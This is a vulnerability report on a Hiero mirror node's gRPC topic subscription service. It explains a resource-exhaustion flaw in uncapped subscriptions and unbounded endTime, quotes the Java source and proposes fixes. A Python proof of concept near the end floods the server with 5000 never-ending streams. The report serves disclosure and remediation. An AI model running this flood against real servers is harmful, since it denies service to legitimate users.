### Title
Unbounded Subscription Resource Exhaustion via Uncapped `endTime` in `pastEndTime()` Polling Loop

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no limit on concurrent subscriptions and no upper bound on the `endTime` field. When `endTime` is set, `pastEndTime()` creates a `RepeatSpec` with `Long.MAX_VALUE` repetitions and a 30-second fixed delay that runs for the entire lifetime of the subscription. An unprivileged user can open an arbitrary number of subscriptions with `endTime` set to `Long.MAX_VALUE`, holding open an unbounded number of live listener connections, periodic scheduler tasks, and in-memory `TopicContext` objects, causing server-side resource starvation.

### Finding Description

**Code location:** `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`

**`pastEndTime()` — lines 123–131:** [1](#0-0) 

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```

When `endTime` is non-null, this creates a `RepeatSpec` with up to `Long.MAX_VALUE` iterations, polling every `endTimeInterval` (default: 30 seconds). The loop terminates only when `isComplete()` returns `true`.

**`isComplete()` — lines 203–214:** [2](#0-1) 

`isComplete()` returns `true` only when `Instant.now()` is past `endTime + endTimeInterval`. With `endTime = Long.MAX_VALUE` nanoseconds, this condition is never satisfied in practice, keeping the polling loop alive indefinitely.

**`subscribeTopic()` — lines 59–92:** [3](#0-2) 

Each call allocates a `TopicContext`, a live `topicListener.listen()` subscription, and the `pastEndTime()` polling flux. The `subscriberCount` is tracked only as a metrics gauge — it is never checked against any maximum.

**`TopicMessageFilter` validation — lines 43–50:** [4](#0-3) 

The only constraint on `endTime` is `endTime > startTime`. There is no maximum `endTime` value enforced. An attacker can legally pass `endTime = Long.MAX_VALUE`.

**Root cause:** The combination of (1) no per-client or global subscription concurrency limit, (2) no upper bound on `endTime`, and (3) a `Long.MAX_VALUE`-iteration polling loop that lives for the full subscription duration creates an unbounded resource accumulation path reachable by any unauthenticated gRPC client.

### Impact Explanation

Each open subscription with a far-future `endTime` holds:
- A live `topicListener.listen()` reactive subscription (and potentially a backing DB/Redis connection)
- A periodic scheduled task on `Schedulers.parallel()` firing every 30 seconds
- An in-memory `TopicContext` with associated `AtomicLong`, `AtomicReference`, `Stopwatch`, and filter objects

With enough concurrent subscriptions, the server exhausts heap memory, saturates the parallel scheduler's task queue, and starves legitimate subscribers. The `safetyCheck` flux additionally uses `Schedulers.boundedElastic()` per subscription (line 70), which has a bounded thread pool; enough subscriptions will exhaust it as well. [5](#0-4) 

Severity: **Medium** — no direct fund loss, but full service denial is achievable.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is the primary public API surface. No authentication or rate-limiting is visible in this layer. Any client with network access can open subscriptions in a tight loop. The attack is trivially scriptable (open N gRPC streams with `endTime = Long.MAX_VALUE`) and fully repeatable.

### Recommendation

1. **Cap `endTime`**: Add a `@Max` or custom `@AssertTrue` constraint in `TopicMessageFilter` limiting `endTime` to at most, e.g., `now + 7 days`.
2. **Enforce a global/per-client subscription limit**: Check `subscriberCount` (or a per-IP counter) in `subscribeTopic()` and reject new subscriptions above a configurable threshold.
3. **Add a maximum subscription duration**: Regardless of `endTime`, terminate subscriptions after a configurable wall-clock duration using `.timeout(maxDuration)`.
4. **Rate-limit at the gRPC server level**: Use Netty connection limits (`NettyProperties`) or a gRPC interceptor to throttle new stream creation per client.

### Proof of Concept

```python
import grpc
# Use the Hedera/Hiero mirror node proto stubs
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
import threading

TOPIC_ID = ...  # any valid topic ID
END_TIME  = 2**63 - 1  # Long.MAX_VALUE nanoseconds

def open_subscription():
    channel = grpc.insecure_channel("mirror-node-grpc:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=...,
        consensusEndTime=END_TIME,
    )
    for _ in stub.subscribeTopic(request):
        pass  # drain silently

threads = [threading.Thread(target=open_subscription) for _ in range(5000)]
for t in threads:
    t.start()
# Server-side: subscriberCount climbs unboundedly; heap and scheduler saturate.
```

Each thread holds a live gRPC stream backed by a `pastEndTime()` loop that will not terminate until the year ~2262, exhausting server resources.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-214)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-50)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }

    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
```
